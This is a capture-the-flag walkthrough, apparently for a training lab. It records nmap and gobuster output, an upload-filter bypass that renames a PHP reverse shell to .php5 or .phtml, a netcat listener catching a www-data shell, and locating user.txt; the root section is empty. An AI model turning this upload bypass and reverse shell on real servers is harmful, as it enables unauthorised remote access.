## Target info
10.10.182.156

## Missions
- Root the target and find a flag in user.txt
- Escalate privileges and find a flag in root.txt 

## Performance
### Recon

    root@ip-10-10-91-11:~# nmap -sV -sC 10.10.182.156
    Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-30 10:52 BST
    Nmap scan report for 10.10.182.156
    Host is up (0.00080s latency).
    Not shown: 998 closed ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
    |   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
    |_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: HackIT - Home
    MAC Address: 02:67:2F:32:47:6F (Unknown)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 8.02 seconds
    root@ip-10-10-91-11:~# 

###  Root the target and find a flag in user.txt
Find directories on the web server using the GoBuster tool and discover the hidden directory

    root@ip-10-10-91-11:~# gobuster dir -u http://10.10.182.156 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sh,txt,cgo,html,js,css,py
    ===============================================================
    Gobuster v3.6
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
    ===============================================================
    [+] Url:                     http://10.10.182.156
    [+] Method:                  GET
    [+] Threads:                 10
    [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Negative Status codes:   404
    [+] User Agent:              gobuster/3.6
    [+] Extensions:              html,js,css,py,php,sh,txt,cgo
    [+] Timeout:                 10s
    ===============================================================
    Starting gobuster in directory enumeration mode
    ===============================================================
    /.html                (Status: 403) [Size: 278]
    /.php                 (Status: 403) [Size: 278]
    /index.php            (Status: 200) [Size: 616]
    /uploads              (Status: 301) [Size: 316] 
    /css                  (Status: 301) [Size: 312] [--> http://10.10.182.156/css/]
    /js                   (Status: 301) [Size: 311] [--> http://10.10.182.156/js/]
    /panel                (Status: 301) [Size: 314] [--> http://10.10.182.156/panel/]

The hidden directory is /panel/

Reverse shell 🐚 Upload

1. **Generate Reverse Shell**
   - Visit: [https://pentestmonkey.net/tools/web-shells/php-reverse-shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)
   - Download and extract the php reverse shell .gz
   - Save the shell as `shell.php5` or `shell.phtml` (avoid `.php` as it's blocked).
   - Change the following info in the shell
   
            ip [myip]
            port [9999]

3. **Upload Shell**
   - Go to: `http://10.10.182.156/panel`
   - Upload your renamed shell file.

4. **Start Listener**

        root@ip-10-10-91-11:~# nc -lvnp 9999
        Listening on 0.0.0.0 9999
        Connection received on 10.10.182.156 47768
        Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
         13:31:12 up 17 min,  0 users,  load average: 0.00, 0.03, 0.09
        USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
        uid=33(www-data) gid=33(www-data) groups=33(www-data)
        /bin/sh: 0: can't access tty; job control turned off
        $
   
Find the flag in user.txt

        $ find file ./* | grep "user.txt"
        ...
        ./var/www/user.txt
        $ cat ./var/www/user.txt
        
The result of the cat command will show the flag!

### Escalate privileges and find a flag in root.txt




